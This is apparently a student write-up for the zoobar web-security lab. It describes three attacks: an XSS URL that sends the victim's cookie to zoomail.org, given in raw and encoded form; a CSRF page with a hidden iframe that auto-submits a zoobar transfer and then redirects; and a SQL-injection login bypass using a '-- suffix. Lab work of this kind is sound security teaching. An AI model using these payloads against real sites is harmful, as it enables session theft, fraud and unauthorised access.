Attack A: Cookie Theft

The aim of this exploit was to create a URL that would make use of the zoommail email script to mail a user's cookie to us. This is possible
because the code after the user variable in the URL is inserted as value for user. First it is necessary to end the value variable
with ".  Then it is necessary to end the input element with a >.  After this, you can insert any javascript you want starting with the <script>.

It allows us to insert JavaScript which gets executed in the webpage. Instead of displaying the cookie information though, we wanted to convince the webpage to invoke the
zoomail.org script and e-mail the cookie to us. For that, we created a JavaScript image element with src set to a URL in the format of zoommail.org. We
wanted the payload of the email to be the cookie associated with the zoobar webpage which can be accessed
as "document.cookie".
   
<script>
new Image().src='http://zoomail.org/sendmail.php?netid=pmcollins2&payload='+document.cookie+'&random='+Math.random();
</script>

This would successfully e-mail us the cookie but would cause "size=10>" to be displayed between the
entry box and view button.  It would also cause a red error message to appear.  In order to get around
this, after e-mailing the cookie we then wanted to switch back to the original webpage.  We did this using
the document.location property in javascript.  

document.location='/users.php';

The final piece was to encode the punctuation in the URL where necessary (: / < > etc).

http://zoobar.org/users.php?user=\"\>\<script\>new\ Image().src\=\'http\:\/\/zoomail.org\/sendmail.php\?netid\=pmcollins2\&payload\=\'\+document.cookie\+\'\&random\=\'\+Math.random()\;document.location\=\'\/users.php\'\;\<\/script\>

http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dpmcollins2\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E


Attack B: Cross-Site Request Forgery 

The goal here was to create an HTML document that, when loaded in a browser, will transfer 10 zoobars from the user's account(if logged in) to the attacker's account. 
And it will then redirect the browser to http://www.google.com/ so that the user will not notice the transfer. 

To accomplish this, we had to make the browser to send a malicious transfer request to zoobar.org/transfer.php. This was done by creating
a form with the action attribute set to the trasfer URL. For the user to not see the form, the target attribute was set to be an invisible
iframe. 

	<iframe id="frame" name="frame" style="visibility: hidden"></iframe>
		<form id="attack" method="POST" target="frame" action="http://zoobar.org/transfer.php">


To set up the transfer of zoobars, we set the following values of the transfer form, taken from the transfer.php code for zoobar:

	<input name="zoobars" type="hidden" value="10">
	<input name="recipient" type="hidden" value="attacker">

To submit the form without any user interaction, we used the window.onload property. We created a function that will run when the window loads and when the form is
submitted.  The first time the function is called, we only want to click the send button:

	document.getElementById('send').click();

The second time the function is called, we want to redirect the browser to the google home webpage, which we do by changing the document.location property:

	document.location='http://www.google.com/';


Attack C: SQL Injection


The goal of this attack was to create an HTML document where, user can login to zoobar.org under that username. This was done 
by using SQL Injection and will work for any credenials that is already registered. The HTML document first posts a form that allows 
the user to input a name and password and then submit them.  When the user submits, the javascript attack() function is run.  
This takes the submitted username and appends '-- to it.

When the user submits the userbane, it will be submitted as a registered under username'--. This process happens in auth.php in the function
_addRegistration. It will search the database for a userId associated with the given username. It will then add this user to the database
and then proceed to log them in with the _checkLogin function.

That function also goes through $quoteduser input, so it will search for the new username'--. Then the password gets hashed and searches
for an entry with the specified username and hashed password to check for a match. This $username variable will not be escaped, so

$sql = "SELECT * FROM Person WHERE Username = '$username' AND Password = '$hashedpassword';

becomes

$sql = "SELECT * FROM Person WHERE Username = 'username'--' AND Password = '$hashedpassword';

The issue with this attack is that it can only be executed once because it will only work if the username is not already in the database.
To fix this, we append a random number to the ende of the username after the '--.

 


